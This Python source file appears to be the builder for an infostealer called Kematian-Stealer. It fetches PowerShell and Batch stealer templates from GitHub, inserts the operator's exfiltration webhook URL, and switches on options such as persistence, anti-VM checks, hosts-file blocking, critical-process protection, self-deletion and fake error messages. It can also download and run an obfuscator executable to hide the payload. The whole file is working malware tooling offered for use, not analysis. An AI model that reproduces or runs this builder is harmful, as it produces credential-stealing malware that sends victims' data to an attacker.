import os

import requests


class BuildPayload:
    def __init__(self):
        self.langs = [
            "Powershell",
            "Batch",
        ]
        self.encryption_key = ""

    def build(self, language: str, url: str, options: dict[str, bool]) -> bool:
        match language:
            case "Powershell":
                self.build_ps1(url, options)
                return True
            case "Batch":
                self.build_bat(url, options)
                return True
            case _:
                return False

    def get_languages(self) -> list[str]:
        return self.langs

    def _replace(
        self,
        content: str,
        options: dict[str, bool],
        url: str,
        hashtags: bool = False,
    ) -> str:
        if hashtags:
            hashtag = "#"
            quotes = '"'
        else:
            hashtag = ""
            quotes = "'"
        content = content.replace(
            f"{hashtag}$webhook = {quotes}YOUR_URL_HERE_SERVER{quotes}",
            f"$webhook = 'h' + '{url[1:]}/data'",
        )

        content = (
            content.replace(
                f"{hashtag}$debug = $false",
                f"$debug=${str(options['debug']).lower()}",
            )
            .replace(
                f"{hashtag}$blockhostsfile = $false",
                f"$blockhostsfile=${str(options['blockhostsfile']).lower()}",
            )
            .replace(
                f"{hashtag}$criticalprocess = $false",
                f"$criticalprocess=${str(options['criticalprocess']).lower()}",
            )
            .replace(
                f"{hashtag}$melt = $false",
                f"$melt=${str(options['melt']).lower()}",
            )
            .replace(
                f"{hashtag}$fakeerror = $false",
                f"$fakeerror=${str(options['fakeerror']).lower()}",
            )
            .replace(
                f"{hashtag}$persistence = $false",
                f"$persistence=${str(options['persistence']).lower()}",
            )
            .replace(
                f"{hashtag}$vm_protect = $false",
                f"$vm_protect=${str(options['anti_vm']).lower()}",
            )
        )

        return content

    def build_bat(self, url: str, options: dict[str, bool]) -> None:
        github_raw_url_bat = "https://raw.githubusercontent.com/Somali-Devs/Kematian-Stealer/main/frontend-src/main.bat"
        content = requests.get(github_raw_url_bat).text.strip()

        content = self._replace(content, options, url)

        with open("kdot.bat", "w", newline="") as f:
            f.write(content)

        if options["obfuscate"]:
            somalifuscator_url = "https://github.com/KDot227/SomalifuscatorV2/releases/download/AutoBuild/main.exe"

            r = requests.get(somalifuscator_url, allow_redirects=True)

            with open("somalifuscator.exe", "wb") as f:
                f.write(r.content)

            os.system("somalifuscator.exe -f kdot.bat")

            os.remove("somalifuscator.exe")
            os.remove("kdot.bat")
            os.remove("settings.json")

            os.rename("kdot_obf.bat", "kdot.bat")

    def build_ps1(self, url: str, options: dict[str, bool]) -> None:
        github_raw_url_ps1 = "https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1"
        content = requests.get(github_raw_url_ps1).text.strip()

        content = self._replace(content, options, url, hashtags=True)

        with open("kdot.ps1", "w", newline="") as f:
            f.write(content)
